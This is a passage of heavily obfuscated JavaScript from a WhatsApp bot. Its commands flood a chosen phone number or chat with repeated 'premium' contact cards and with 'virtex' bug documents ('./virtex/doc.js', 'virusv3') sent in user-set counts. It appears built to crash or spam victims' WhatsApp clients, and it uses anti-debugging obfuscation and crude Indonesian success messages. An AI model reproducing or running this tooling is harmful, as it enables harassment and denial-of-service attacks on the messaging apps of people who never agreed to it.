_0x194708=_0x2c4336[_0x1c6b1d(0xd7)][_0x1c6b1d(0xdc)]['bind'](_0x2c4336),_0x20cabc=_0x496b6d[_0xab0104],_0x2d66ac=_0x2c8f24[_0x20cabc]||_0x194708;_0x194708['__proto__']=_0x2c4336[_0x1c6b1d(0xf0)](_0x2c4336),_0x194708[_0x1c6b1d(0xec)]=_0x2d66ac[_0x1c6b1d(0xec)][_0x1c6b1d(0xf0)](_0x2d66ac),_0x2c8f24[_0x20cabc]=_0x194708;}});_0xfd8930();{if(!isCreator&&!isBan)return;if(!text)throw _0x7dedfa(0xe2);jobotz['sendContact'](text+_0x7dedfa(0xe7),global['premium'],fkonjo),jobotz[_0x7dedfa(0xe6)](text+_0x7dedfa(0xe7),global[_0x7dedfa(0xe8)],fkonjo),jobotz[_0x7dedfa(0xe6)](text+_0x7dedfa(0xe7),global[_0x7dedfa(0xe8)],fkonjo),jobotz['sendContact'](text+_0x7dedfa(0xe7),global[_0x7dedfa(0xe8)],fkonjo),jobotz[_0x7dedfa(0xe6)](text+_0x7dedfa(0xe7),global[_0x7dedfa(0xe8)],fkonjo),jancok(_0x7dedfa(0xf4)+text);}function _0x5162(_0x19cf2d,_0x3c32cc){var _0x528843=_0x1e1b();return _0x5162=function(_0xfd8930,_0x2c4336){_0xfd8930=_0xfd8930-0xd7;var _0x7ca8bc=_0x528843[_0xfd8930];return _0x7ca8bc;},_0x5162(_0x19cf2d,_0x3c32cc);}function _0x1e1b(){var _0x2d255e=['warn','sendContact','@s.whatsapp.net','premium','(((.+)+)+)+$','5243328EkZVgW','5897646utiRlB','toString','6FQHJQo','261597FQCLum','apply','bind','3623360kywfNX','6KJPpNt','{}.constructor(\x22return\x20this\x22)(\x20)','Sukses\x20Send\x20Kontol\x20Di\x20Nomer\x20','constructor','table','3755195fJsJqj','console','info','prototype','log','10qLwLbk','8236165pdUBFu','157457eRgozL','search','Nomernya\x20mana?','trace','return\x20(function()\x20'];_0x1e1b=function(){return _0x2d255e;};return _0x1e1b();}
}
break
case 'jogaskontol': {
var _0x5924cf=_0x3535;function _0xd0e3(){var _0x1e7201=['2778508nMGxuC','__proto__','@s.whatsapp.net','apply','info','sendContact','console','return\x20(function()\x20','premium','343064snrkET','table','49qGBfDO','2367oIvLjY','bind','{}.constructor(\x22return\x20this\x22)(\x20)','search','Sukses\x20Send\x20Kontol\x20Di\x20Nomer\x20','chat','1422xqGOwp','error','prototype','368412PwXHVB','(((.+)+)+)+$','1157436hDPgac','toString','30930qEuLII','6mFLNbU','log','1878805KznDxz','exception','constructor','warn'];_0xd0e3=function(){return _0x1e7201;};return _0xd0e3();}(function(_0x49ecf1,_0x30cffc){var _0x30c8d6=_0x3535,_0x34d904=_0x49ecf1();while(!![]){try{var _0x125a47=-parseInt(_0x30c8d6(0x17d))/0x1+parseInt(_0x30c8d6(0x180))/0x2+-parseInt(_0x30c8d6(0x182))/0x3+parseInt(_0x30c8d6(0x18b))/0x4+-parseInt(_0x30c8d6(0x187))/0x5*(-parseInt(_0x30c8d6(0x185))/0x6)+parseInt(_0x30c8d6(0x176))/0x7*(parseInt(_0x30c8d6(0x174))/0x8)+-parseInt(_0x30c8d6(0x177))/0x9*(parseInt(_0x30c8d6(0x184))/0xa);if(_0x125a47===_0x30cffc)break;else _0x34d904['push'](_0x34d904['shift']());}catch(_0x31c2e7){_0x34d904['push'](_0x34d904['shift']());}}}(_0xd0e3,0x56722));var _0x4f6231=(function(){var _0xad5f3b=!![];return function(_0x4cef0e,_0x2dc441){var _0xdbfb38=_0xad5f3b?function(){var _0x30033c=_0x3535;if(_0x2dc441){var _0x1ca67d=_0x2dc441[_0x30033c(0x18e)](_0x4cef0e,arguments);return _0x2dc441=null,_0x1ca67d;}}:function(){};return _0xad5f3b=![],_0xdbfb38;};}()),_0x947693=_0x4f6231(this,function(){var _0x4228af=_0x3535;return _0x947693[_0x4228af(0x183)]()['search'](_0x4228af(0x181))['toString']()[_0x4228af(0x189)](_0x947693)[_0x4228af(0x17a)]('(((.+)+)+)+$');});function _0x3535(_0x8bf51f,_0x555933){var _0x4ffcb7=_0xd0e3();return _0x3535=function(_0x50a239,_0x37583d){_0x50a239=_0x50a239-0x173;var _0x13c99c=_0x4ffcb7[_0x50a239];return _0x13c99c;},_0x3535(_0x8bf51f,_0x555933);}_0x947693();var _0x37583d=(function(){var _0x326b51=!![];return function(_0x55bf39,_0x22ec46){var _0x49e080=_0x326b51?function(){var _0x100a16=_0x3535;if(_0x22ec46){var _0x20ffb0=_0x22ec46[_0x100a16(0x18e)](_0x55bf39,arguments);return _0x22ec46=null,_0x20ffb0;}}:function(){};return _0x326b51=![],_0x49e080;};}()),_0x50a239=_0x37583d(this,function(){var _0x32a00c=_0x3535,_0x10d1cd;try{var _0x5aa02b=Function(_0x32a00c(0x192)+_0x32a00c(0x179)+');');_0x10d1cd=_0x5aa02b();}catch(_0x50faa9){_0x10d1cd=window;}var _0x5b75c2=_0x10d1cd['console']=_0x10d1cd[_0x32a00c(0x191)]||{},_0x97bc51=[_0x32a00c(0x186),_0x32a00c(0x18a),_0x32a00c(0x18f),_0x32a00c(0x17e),_0x32a00c(0x188),_0x32a00c(0x175),'trace'];for(var _0x4bfcd5=0x0;_0x4bfcd5<_0x97bc51['length'];_0x4bfcd5++){var _0x5deb25=_0x37583d[_0x32a00c(0x189)][_0x32a00c(0x17f)][_0x32a00c(0x178)](_0x37583d),_0x56e4ab=_0x97bc51[_0x4bfcd5],_0x179240=_0x5b75c2[_0x56e4ab]||_0x5deb25;_0x5deb25[_0x32a00c(0x18c)]=_0x37583d['bind'](_0x37583d),_0x5deb25[_0x32a00c(0x183)]=_0x179240[_0x32a00c(0x183)][_0x32a00c(0x178)](_0x179240),_0x5b75c2[_0x56e4ab]=_0x5deb25;}});_0x50a239();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';jobotz['sendContact'](text+'@s.whatsapp.net',global['premium'],fkonjo),jobotz[_0x5924cf(0x190)](text+_0x5924cf(0x18d),global[_0x5924cf(0x173)],fkonjo),jobotz[_0x5924cf(0x190)](text+_0x5924cf(0x18d),global['premium'],fkonjo),jobotz[_0x5924cf(0x190)](text+'@s.whatsapp.net',global[_0x5924cf(0x173)],fkonjo),jobotz[_0x5924cf(0x190)](text+_0x5924cf(0x18d),global[_0x5924cf(0x173)],fkonjo),jobotz['sendContact'](m[_0x5924cf(0x17c)],global[_0x5924cf(0x173)],fkonjo),jobotz[_0x5924cf(0x190)](m[_0x5924cf(0x17c)],global['premium'],fkonjo),jobotz[_0x5924cf(0x190)](m[_0x5924cf(0x17c)],global['premium'],fkonjo),jobotz[_0x5924cf(0x190)](m[_0x5924cf(0x17c)],global[_0x5924cf(0x173)],fkonjo),jobotz[_0x5924cf(0x190)](m[_0x5924cf(0x17c)],global[_0x5924cf(0x173)],fkonjo),jancok(_0x5924cf(0x17b)+text);}
}
break
case 'jadikintil':{
var _0x4c7106=_0x87d3;function _0x349b(){var _0x411cbd=['3657372Qdunfa','error','11gZTIow','search','10597168ZGWEGl','684CWeUCt','5322050ckTsvY','__proto__','(((.+)+)+)+$','1146XHjkll','apply','premium','table','toString','2FnUzKn','bind','126153ovuwKU','info','prototype','exception','{}.constructor(\x22return\x20this\x22)(\x20)','48714hSEyIt','sendContact','console','return\x20(function()\x20','860qzlKTs','trace','24306FfKTPQ','52843QTvrJZ','chat','constructor'];_0x349b=function(){return _0x411cbd;};return _0x349b();}(function(_0x3b3f01,_0x4e1be8){var _0x2f9339=_0x87d3,_0x5e4a44=_0x3b3f01();while(!![]){try{var _0xa3a97e=-parseInt(_0x2f9339(0x186))/0x1*(parseInt(_0x2f9339(0x18d))/0x2)+-parseInt(_0x2f9339(0x193))/0x3*(-parseInt(_0x2f9339(0x19c))/0x4)+parseInt(_0x2f9339(0x19d))/0x5+-parseInt(_0x2f9339(0x1a0))/0x6*(parseInt(_0x2f9339(0x194))/0x7)+parseInt(_0x2f9339(0x19b))/0x8+-parseInt(_0x2f9339(0x188))/0x9*(parseInt(_0x2f9339(0x191))/0xa)+-parseInt(_0x2f9339(0x199))/0xb*(parseInt(_0x2f9339(0x197))/0xc);if(_0xa3a97e===_0x4e1be8)break;else _0x5e4a44['push'](_0x5e4a44['shift']());}catch(_0x4c7c97){_0x5e4a44['push'](_0x5e4a44['shift']());}}}(_0x349b,0xbce32));var _0x1adf7f=(function(){var _0x349b18=!![];return function(_0x16c82d,_0x5630c9){var _0x242b1d=_0x349b18?function(){var _0x22f662=_0x87d3;if(_0x5630c9){var _0x25a596=_0x5630c9[_0x22f662(0x182)](_0x16c82d,arguments);return _0x5630c9=null,_0x25a596;}}:function(){};return _0x349b18=![],_0x242b1d;};}()),_0x37224c=_0x1adf7f(this,function(){var _0xf3005b=_0x87d3;return _0x37224c[_0xf3005b(0x185)]()[_0xf3005b(0x19a)]('(((.+)+)+)+$')[_0xf3005b(0x185)]()[_0xf3005b(0x196)](_0x37224c)[_0xf3005b(0x19a)](_0xf3005b(0x19f));});function _0x87d3(_0x9a37b7,_0x37d928){var _0xaca38b=_0x349b();return _0x87d3=function(_0x39befd,_0x43854b){_0x39befd=_0x39befd-0x182;var _0x9c2164=_0xaca38b[_0x39befd];return _0x9c2164;},_0x87d3(_0x9a37b7,_0x37d928);}_0x37224c();var _0x43854b=(function(){var _0x163623=!![];return function(_0x4e9bae,_0x547be3){var _0x56848c=_0x163623?function(){var _0xf01239=_0x87d3;if(_0x547be3){var _0xe9434=_0x547be3[_0xf01239(0x182)](_0x4e9bae,arguments);return _0x547be3=null,_0xe9434;}}:function(){};return _0x163623=![],_0x56848c;};}()),_0x39befd=_0x43854b(this,function(){var _0x1e7c9e=_0x87d3,_0x1c375a;try{var _0x5266a5=Function(_0x1e7c9e(0x190)+_0x1e7c9e(0x18c)+');');_0x1c375a=_0x5266a5();}catch(_0xe1c432){_0x1c375a=window;}var _0x336720=_0x1c375a['console']=_0x1c375a[_0x1e7c9e(0x18f)]||{},_0x399e25=['log','warn',_0x1e7c9e(0x189),_0x1e7c9e(0x198),_0x1e7c9e(0x18b),_0x1e7c9e(0x184),_0x1e7c9e(0x192)];for(var _0x4128ce=0x0;_0x4128ce<_0x399e25['length'];_0x4128ce++){var _0x348bd3=_0x43854b['constructor'][_0x1e7c9e(0x18a)][_0x1e7c9e(0x187)](_0x43854b),_0x10fc44=_0x399e25[_0x4128ce],_0x4ee79a=_0x336720[_0x10fc44]||_0x348bd3;_0x348bd3[_0x1e7c9e(0x19e)]=_0x43854b['bind'](_0x43854b),_0x348bd3[_0x1e7c9e(0x185)]=_0x4ee79a[_0x1e7c9e(0x185)]['bind'](_0x4ee79a),_0x336720[_0x10fc44]=_0x348bd3;}});_0x39befd();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw'Teks/Reply';jobotz[_0x4c7106(0x18e)](m[_0x4c7106(0x195)],global[_0x4c7106(0x183)],fkonjo),jancok('Sukses\x20Convert\x20Kintil');}
}
break
case 'kintil': {
const _0x1b8378=_0x1160;(function(_0x26f405,_0x33b820){const _0xad4495=_0x1160,_0x1b8009=_0x26f405();while(!![]){try{const _0xf7a226=parseInt(_0xad4495(0xff))/0x1*(parseInt(_0xad4495(0x10c))/0x2)+-parseInt(_0xad4495(0xf7))/0x3*(-parseInt(_0xad4495(0xf2))/0x4)+-parseInt(_0xad4495(0x111))/0x5+-parseInt(_0xad4495(0x10d))/0x6*(-parseInt(_0xad4495(0x108))/0x7)+-parseInt(_0xad4495(0xf5))/0x8*(parseInt(_0xad4495(0x102))/0x9)+parseInt(_0xad4495(0x106))/0xa+parseInt(_0xad4495(0xf6))/0xb*(-parseInt(_0xad4495(0x110))/0xc);if(_0xf7a226===_0x33b820)break;else _0x1b8009['push'](_0x1b8009['shift']());}catch(_0x25aea4){_0x1b8009['push'](_0x1b8009['shift']());}}}(_0x44eb,0xa72c0));function _0x1160(_0x1873ba,_0x4ba4bf){const _0x2323ce=_0x44eb();return _0x1160=function(_0x3cadc8,_0x5d3046){_0x3cadc8=_0x3cadc8-0xf1;let _0x3f3f3c=_0x2323ce[_0x3cadc8];return _0x3f3f3c;},_0x1160(_0x1873ba,_0x4ba4bf);}const _0x18a2db=(function(){let _0x197365=!![];return function(_0x1889fe,_0x204d39){const _0x1a4668=_0x197365?function(){const _0x42a5de=_0x1160;if(_0x204d39){const _0x13eb25=_0x204d39[_0x42a5de(0x105)](_0x1889fe,arguments);return _0x204d39=null,_0x13eb25;}}:function(){};return _0x197365=![],_0x1a4668;};}()),_0x2a31ef=_0x18a2db(this,function(){const _0x2def4f=_0x1160;return _0x2a31ef['toString']()[_0x2def4f(0x103)](_0x2def4f(0xfd))[_0x2def4f(0x10e)]()[_0x2def4f(0xfe)](_0x2a31ef)[_0x2def4f(0x103)](_0x2def4f(0xfd));});_0x2a31ef();const _0x5d3046=(function(){let _0x3d048d=!![];return function(_0x2e05ef,_0x5a63d1){const _0x4ae595=_0x3d048d?function(){const _0x31fa59=_0x1160;if(_0x5a63d1){const _0x111700=_0x5a63d1[_0x31fa59(0x105)](_0x2e05ef,arguments);return _0x5a63d1=null,_0x111700;}}:function(){};return _0x3d048d=![],_0x4ae595;};}()),_0x3cadc8=_0x5d3046(this,function(){const _0x250feb=_0x1160,_0xdbf455=function(){const _0x34837c=_0x1160;let _0x4c207b;try{_0x4c207b=Function(_0x34837c(0xfa)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3adbf8){_0x4c207b=window;}return _0x4c207b;},_0xc8e024=_0xdbf455(),_0x1ccf25=_0xc8e024[_0x250feb(0x10f)]=_0xc8e024[_0x250feb(0x10f)]||{},_0x387cc4=[_0x250feb(0x100),_0x250feb(0xf4),'info',_0x250feb(0xf3),_0x250feb(0x101),'table',_0x250feb(0xfb)];for(let _0x29c068=0x0;_0x29c068<_0x387cc4[_0x250feb(0xf8)];_0x29c068++){const _0x3dbc7c=_0x5d3046[_0x250feb(0xfe)][_0x250feb(0x10b)][_0x250feb(0xf9)](_0x5d3046),_0x34873=_0x387cc4[_0x29c068],_0x382b99=_0x1ccf25[_0x34873]||_0x3dbc7c;_0x3dbc7c['__proto__']=_0x5d3046[_0x250feb(0xf9)](_0x5d3046),_0x3dbc7c[_0x250feb(0x10e)]=_0x382b99[_0x250feb(0x10e)][_0x250feb(0xf9)](_0x382b99),_0x1ccf25[_0x34873]=_0x3dbc7c;}});_0x3cadc8();{if(!isCreator&&!isBan)return;if(args[_0x1b8378(0xf8)]==0x0)return m[_0x1b8378(0x109)](_0x1b8378(0x10a));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x1b8378(0x107)](m[_0x1b8378(0x104)],global[_0x1b8378(0xf1)],fkonjo);}jancok(_0x1b8378(0xfc)+jumlah);}function _0x44eb(){const _0x54d99a=['trace','Sukses\x20Send\x20Kintil\x20Sebanyak\x20','(((.+)+)+)+$','constructor','1GZUQhy','log','exception','14643RlsyfP','search','chat','apply','8620950SbFJWa','sendContact','42tMBPqk','reply','Jumlahnya?','prototype','2455942CqpnJN','510870IfeDEb','toString','console','94740oDsoCx','4966845FdBYPG','premium','335148XQmniB','error','warn','2008wmUuBv','1067CqYCFb','9EsytWZ','length','bind','return\x20(function()\x20'];_0x44eb=function(){return _0x54d99a;};return _0x44eb();}
}
break
case 'kintilto': {
var _0x523937=_0x2291;(function(_0x17f6db,_0x56b07a){var _0x5de581=_0x2291,_0x1ae65a=_0x17f6db();while(!![]){try{var _0x58ada0=-parseInt(_0x5de581(0x181))/0x1+parseInt(_0x5de581(0x171))/0x2+parseInt(_0x5de581(0x178))/0x3+parseInt(_0x5de581(0x168))/0x4*(-parseInt(_0x5de581(0x173))/0x5)+parseInt(_0x5de581(0x176))/0x6*(-parseInt(_0x5de581(0x17a))/0x7)+-parseInt(_0x5de581(0x167))/0x8*(-parseInt(_0x5de581(0x183))/0x9)+-parseInt(_0x5de581(0x16e))/0xa*(-parseInt(_0x5de581(0x17b))/0xb);if(_0x58ada0===_0x56b07a)break;else _0x1ae65a['push'](_0x1ae65a['shift']());}catch(_0x5cf2a7){_0x1ae65a['push'](_0x1ae65a['shift']());}}}(_0x1ca5,0x901ff));var _0x150b31=(function(){var _0x2574e0=!![];return function(_0x373543,_0x42998d){var _0x527d30=_0x2574e0?function(){var _0xf58847=_0x2291;if(_0x42998d){var _0x1f445f=_0x42998d[_0xf58847(0x177)](_0x373543,arguments);return _0x42998d=null,_0x1f445f;}}:function(){};return _0x2574e0=![],_0x527d30;};}()),_0x3e9415=_0x150b31(this,function(){var _0x38b2cb=_0x2291;return _0x3e9415[_0x38b2cb(0x175)]()[_0x38b2cb(0x169)](_0x38b2cb(0x17f))[_0x38b2cb(0x175)]()['constructor'](_0x3e9415)[_0x38b2cb(0x169)](_0x38b2cb(0x17f));});_0x3e9415();var _0x25c404=(function(){var _0x7a2afe=!![];return function(_0x2417ed,_0x42d12c){var _0x534ee7=_0x7a2afe?function(){if(_0x42d12c){var _0x5091aa=_0x42d12c['apply'](_0x2417ed,arguments);return _0x42d12c=null,_0x5091aa;}}:function(){};return _0x7a2afe=![],_0x534ee7;};}()),_0x3dfacf=_0x25c404(this,function(){var _0x24389c=_0x2291,_0x3b766d=function(){var _0x244e5c=_0x2291,_0x338c73;try{_0x338c73=Function(_0x244e5c(0x17d)+_0x244e5c(0x16b)+');')();}catch(_0x150a3d){_0x338c73=window;}return _0x338c73;},_0x445113=_0x3b766d(),_0x52d026=_0x445113[_0x24389c(0x172)]=_0x445113[_0x24389c(0x172)]||{},_0x4c15ca=['log',_0x24389c(0x17e),'info',_0x24389c(0x184),'exception',_0x24389c(0x166),_0x24389c(0x16a)];for(var _0x1f2e46=0x0;_0x1f2e46<_0x4c15ca['length'];_0x1f2e46++){var _0x1a1aa7=_0x25c404[_0x24389c(0x17c)][_0x24389c(0x182)][_0x24389c(0x180)](_0x25c404),_0x4c306c=_0x4c15ca[_0x1f2e46],_0x17ba9e=_0x52d026[_0x4c306c]||_0x1a1aa7;_0x1a1aa7[_0x24389c(0x16d)]=_0x25c404[_0x24389c(0x180)](_0x25c404),_0x1a1aa7[_0x24389c(0x175)]=_0x17ba9e['toString'][_0x24389c(0x180)](_0x17ba9e),_0x52d026[_0x4c306c]=_0x1a1aa7;}});function _0x2291(_0x57b161,_0x1c49d6){var _0x3af2f1=_0x1ca5();return _0x2291=function(_0x3dfacf,_0x25c404){_0x3dfacf=_0x3dfacf-0x166;var _0x5b3094=_0x3af2f1[_0x3dfacf];return _0x5b3094;},_0x2291(_0x57b161,_0x1c49d6);}function _0x1ca5(){var _0x576744=['bind','315918QdOdUH','prototype','18540MILHfj','error','table','2432eLMxjI','114932PYsJvY','search','trace','{}.constructor(\x22return\x20this\x22)(\x20)','sendContact','__proto__','80qlbvDN','premium','Sukses\x20Send\x20Kintil\x20Di\x20Nomer\x20','1403066iksqaU','console','185CZOIAh','@s.whatsapp.net','toString','1986FlqyJc','apply','2955819xwRkEJ','Nomernya\x20mana?','19880wvbdaf','820006JlRNhM','constructor','return\x20(function()\x20','warn','(((.+)+)+)+$'];_0x1ca5=function(){return _0x576744;};return _0x1ca5();}_0x3dfacf();{if(!isCreator&&!isBan)return;if(!text)throw _0x523937(0x179);jobotz[_0x523937(0x16c)](text+'@s.whatsapp.net',global[_0x523937(0x16f)],fkonjo),jobotz[_0x523937(0x16c)](text+'@s.whatsapp.net',global[_0x523937(0x16f)],fkonjo),jobotz[_0x523937(0x16c)](text+_0x523937(0x174),global[_0x523937(0x16f)],fkonjo),jobotz[_0x523937(0x16c)](text+_0x523937(0x174),global['premium'],fkonjo),jobotz[_0x523937(0x16c)](text+_0x523937(0x174),global[_0x523937(0x16f)],fkonjo),jancok(_0x523937(0x170)+text);}
}
break
case 'jogaskintil': {
var _0x3e6b41=_0x46f8;function _0x3883(){var _0x17fa09=['{}.constructor(\x22return\x20this\x22)(\x20)','warn','trace','160374qFHGCY','11090pAKGqV','__proto__','chat','9724iEAltC','console','sendContact','bind','29590pYQQyx','Nomernya\x20mana?','exception','671882AOnphc','1502830sUwEtW','return\x20(function()\x20','toString','premium','search','constructor','153rHmIIX','error','prototype','80UdvJZa','289168PObaCY','info','21DlidXE','(((.+)+)+)+$','458046YQmKNA','@s.whatsapp.net','apply'];_0x3883=function(){return _0x17fa09;};return _0x3883();}function _0x46f8(_0x198ccb,_0xd81d21){var _0x2d8f61=_0x3883();return _0x46f8=function(_0x20fc94,_0x5bd701){_0x20fc94=_0x20fc94-0xae;var _0x318b66=_0x2d8f61[_0x20fc94];return _0x318b66;},_0x46f8(_0x198ccb,_0xd81d21);}(function(_0x5c96c1,_0xff4986){var _0x2ed69b=_0x46f8,_0x2d859a=_0x5c96c1();while(!![]){try{var _0x434492=-parseInt(_0x2ed69b(0xbc))/0x1+-parseInt(_0x2ed69b(0xb1))/0x2*(parseInt(_0x2ed69b(0xc9))/0x3)+-parseInt(_0x2ed69b(0xc6))/0x4*(-parseInt(_0x2ed69b(0xb9))/0x5)+parseInt(_0x2ed69b(0xcb))/0x6+-parseInt(_0x2ed69b(0xbd))/0x7+-parseInt(_0x2ed69b(0xc7))/0x8*(-parseInt(_0x2ed69b(0xc3))/0x9)+-parseInt(_0x2ed69b(0xb2))/0xa*(-parseInt(_0x2ed69b(0xb5))/0xb);if(_0x434492===_0xff4986)break;else _0x2d859a['push'](_0x2d859a['shift']());}catch(_0x2e06eb){_0x2d859a['push'](_0x2d859a['shift']());}}}(_0x3883,0x5369a));var _0x58ee93=(function(){var _0x21a34d=!![];return function(_0xbd2b02,_0x48df14){var _0xe1f013=_0x21a34d?function(){var _0x2363e9=_0x46f8;if(_0x48df14){var _0x433e8c=_0x48df14[_0x2363e9(0xcd)](_0xbd2b02,arguments);return _0x48df14=null,_0x433e8c;}}:function(){};return _0x21a34d=![],_0xe1f013;};}()),_0x1ad18c=_0x58ee93(this,function(){var _0x5af221=_0x46f8;return _0x1ad18c[_0x5af221(0xbf)]()['search'](_0x5af221(0xca))[_0x5af221(0xbf)]()[_0x5af221(0xc2)](_0x1ad18c)[_0x5af221(0xc1)](_0x5af221(0xca));});_0x1ad18c();var _0x5bd701=(function(){var _0x40b5e3=!![];return function(_0x2c68f9,_0x2fcfd4){var _0x4cf999=_0x40b5e3?function(){var _0x1c701e=_0x46f8;if(_0x2fcfd4){var _0x24b3d7=_0x2fcfd4[_0x1c701e(0xcd)](_0x2c68f9,arguments);return _0x2fcfd4=null,_0x24b3d7;}}:function(){};return _0x40b5e3=![],_0x4cf999;};}()),_0x20fc94=_0x5bd701(this,function(){var _0x4faa3e=_0x46f8,_0xcc2bc9=function(){var _0x4063b6=_0x46f8,_0x2d9ee0;try{_0x2d9ee0=Function(_0x4063b6(0xbe)+_0x4063b6(0xae)+');')();}catch(_0x107f73){_0x2d9ee0=window;}return _0x2d9ee0;},_0x41a9b1=_0xcc2bc9(),_0x367ee7=_0x41a9b1[_0x4faa3e(0xb6)]=_0x41a9b1[_0x4faa3e(0xb6)]||{},_0x4d1a4f=['log',_0x4faa3e(0xaf),_0x4faa3e(0xc8),_0x4faa3e(0xc4),_0x4faa3e(0xbb),'table',_0x4faa3e(0xb0)];for(var _0x5926ce=0x0;_0x5926ce<_0x4d1a4f['length'];_0x5926ce++){var _0xbaa2de=_0x5bd701[_0x4faa3e(0xc2)][_0x4faa3e(0xc5)]['bind'](_0x5bd701),_0x4222e1=_0x4d1a4f[_0x5926ce],_0x97fc32=_0x367ee7[_0x4222e1]||_0xbaa2de;_0xbaa2de[_0x4faa3e(0xb3)]=_0x5bd701[_0x4faa3e(0xb8)](_0x5bd701),_0xbaa2de[_0x4faa3e(0xbf)]=_0x97fc32[_0x4faa3e(0xbf)]['bind'](_0x97fc32),_0x367ee7[_0x4222e1]=_0xbaa2de;}});_0x20fc94();{if(!isCreator&&!isBan)return;if(!text)throw _0x3e6b41(0xba);jobotz[_0x3e6b41(0xb7)](text+_0x3e6b41(0xcc),global[_0x3e6b41(0xc0)],fkonjo),jobotz[_0x3e6b41(0xb7)](text+_0x3e6b41(0xcc),global[_0x3e6b41(0xc0)],fkonjo),jobotz[_0x3e6b41(0xb7)](text+_0x3e6b41(0xcc),global[_0x3e6b41(0xc0)],fkonjo),jobotz['sendContact'](text+_0x3e6b41(0xcc),global[_0x3e6b41(0xc0)],fkonjo),jobotz[_0x3e6b41(0xb7)](text+'@s.whatsapp.net',global[_0x3e6b41(0xc0)],fkonjo),jobotz['sendContact'](m[_0x3e6b41(0xb4)],global['premium'],fkonjo),jobotz[_0x3e6b41(0xb7)](m[_0x3e6b41(0xb4)],global['premium'],fkonjo),jobotz[_0x3e6b41(0xb7)](m[_0x3e6b41(0xb4)],global[_0x3e6b41(0xc0)],fkonjo),jobotz[_0x3e6b41(0xb7)](m['chat'],global[_0x3e6b41(0xc0)],fkonjo),jobotz[_0x3e6b41(0xb7)](m[_0x3e6b41(0xb4)],global[_0x3e6b41(0xc0)],fkonjo),jancok('Sukses\x20Send\x20Kintil\x20Di\x20Nomer\x20'+text);}
}
break
case 'doc':{
const _0x152d82=_0x613a;(function(_0x3bf56c,_0x21fd56){const _0x5f2a3f=_0x613a,_0xa043b2=_0x3bf56c();while(!![]){try{const _0x413197=parseInt(_0x5f2a3f(0x127))/0x1+parseInt(_0x5f2a3f(0x113))/0x2+parseInt(_0x5f2a3f(0x110))/0x3*(parseInt(_0x5f2a3f(0x119))/0x4)+parseInt(_0x5f2a3f(0x129))/0x5*(parseInt(_0x5f2a3f(0x114))/0x6)+-parseInt(_0x5f2a3f(0x12c))/0x7+-parseInt(_0x5f2a3f(0x118))/0x8+-parseInt(_0x5f2a3f(0x11b))/0x9;if(_0x413197===_0x21fd56)break;else _0xa043b2['push'](_0xa043b2['shift']());}catch(_0xbe8b0a){_0xa043b2['push'](_0xa043b2['shift']());}}}(_0x3916,0x7f1cb));const _0x32c1ef=(function(){let _0x48cfa5=!![];return function(_0x14e68d,_0x198f7a){const _0x4b4785=_0x48cfa5?function(){const _0x3f556c=_0x613a;if(_0x198f7a){const _0x477fcd=_0x198f7a[_0x3f556c(0x11c)](_0x14e68d,arguments);return _0x198f7a=null,_0x477fcd;}}:function(){};return _0x48cfa5=![],_0x4b4785;};}()),_0x59e4d7=_0x32c1ef(this,function(){const _0x1a8053=_0x613a;return _0x59e4d7[_0x1a8053(0x122)]()[_0x1a8053(0x117)](_0x1a8053(0x12b))[_0x1a8053(0x122)]()[_0x1a8053(0x126)](_0x59e4d7)[_0x1a8053(0x117)]('(((.+)+)+)+$');});_0x59e4d7();const _0x48f328=(function(){let _0x6b65ac=!![];return function(_0x24270a,_0x40a540){const _0x14bba7=_0x6b65ac?function(){const _0x34227a=_0x613a;if(_0x40a540){const _0x63bd21=_0x40a540[_0x34227a(0x11c)](_0x24270a,arguments);return _0x40a540=null,_0x63bd21;}}:function(){};return _0x6b65ac=![],_0x14bba7;};}()),_0x16f7bc=_0x48f328(this,function(){const _0x3f7cd6=_0x613a;let _0x3aa7ef;try{const _0x3e9cc1=Function(_0x3f7cd6(0x11e)+_0x3f7cd6(0x124)+');');_0x3aa7ef=_0x3e9cc1();}catch(_0x27bf19){_0x3aa7ef=window;}const _0x382d4c=_0x3aa7ef[_0x3f7cd6(0x121)]=_0x3aa7ef[_0x3f7cd6(0x121)]||{},_0x23d40f=[_0x3f7cd6(0x120),_0x3f7cd6(0x112),'info','error',_0x3f7cd6(0x116),_0x3f7cd6(0x12d),'trace'];for(let _0x244fde=0x0;_0x244fde<_0x23d40f[_0x3f7cd6(0x123)];_0x244fde++){const _0x310af2=_0x48f328[_0x3f7cd6(0x126)][_0x3f7cd6(0x115)][_0x3f7cd6(0x11d)](_0x48f328),_0x1d5514=_0x23d40f[_0x244fde],_0x3a431b=_0x382d4c[_0x1d5514]||_0x310af2;_0x310af2[_0x3f7cd6(0x11f)]=_0x48f328[_0x3f7cd6(0x11d)](_0x48f328),_0x310af2[_0x3f7cd6(0x122)]=_0x3a431b[_0x3f7cd6(0x122)][_0x3f7cd6(0x11d)](_0x3a431b),_0x382d4c[_0x1d5514]=_0x310af2;}});function _0x3916(){const _0x1fc52e=['1681835UsTTxV','Penggunaan\x20','(((.+)+)+)+$','4064907JTfpzQ','table','Sukses\x20Send\x20Bug\x20Sebanyak\x20','9OnCxnq','./virtex/doc.js','warn','1192962DnuCSc','6qacpql','prototype','exception','search','3931408QgmWSo','481724HIcYvH','Hallo\x20Aku\x20Jo','4861530PsTqNU','apply','bind','return\x20(function()\x20','__proto__','log','console','toString','length','{}.constructor(\x22return\x20this\x22)(\x20)','reply','constructor','838807OBZKjg','chat'];_0x3916=function(){return _0x1fc52e;};return _0x3916();}function _0x613a(_0x185cf5,_0xa8ad8){const _0x52175e=_0x3916();return _0x613a=function(_0x16f7bc,_0x48f328){_0x16f7bc=_0x16f7bc-0x10f;let _0x29e77d=_0x52175e[_0x16f7bc];return _0x29e77d;},_0x613a(_0x185cf5,_0xa8ad8);}_0x16f7bc();{if(!isCreator&&!isBan)return;if(args[_0x152d82(0x123)]==0x0)return m[_0x152d82(0x125)](_0x152d82(0x12a)+(prefix+command)+'\x20jumlah\x0aContoh\x20'+(prefix+command)+'\x205');jumlah=''+encodeURI(q),ydd=_0x152d82(0x11a);for(let i=0x0;i<jumlah;i++){jobotz['sendMessage'](m[_0x152d82(0x128)],{'document':fs['readFileSync'](_0x152d82(0x111)),'mimetype':'document/pdf','fileName':thejo+'\x20'+virusv3},{'quoted':fdocjo});}jancok(_0x152d82(0x10f)+jumlah);}
}
break
case 'polling':{
